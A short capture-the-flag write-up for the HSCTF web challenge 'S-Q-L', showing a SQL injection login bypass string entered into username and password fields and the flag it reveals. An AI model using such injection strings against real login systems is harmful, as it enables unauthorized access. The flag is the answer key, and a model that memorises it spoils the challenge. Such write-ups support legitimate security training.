# S-Q-L
Web

## Challenge 

Written by: dwang

Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.

https://s-q-l.web.chal.hsctf.com/

## Solution

Submit SQL injection strings

	Username: 1' or '1' = '1
	Password: 1' or '1' = '1

We get result

	Hello Keith!
	The flag is hsctf{mysql_real_escape_string}

Reference

- https://stackoverflow.com/questions/50591776/why-is-my-code-not-vulnerable-to-sql-injection

## Flag

	hsctf{mysql_real_escape_string}
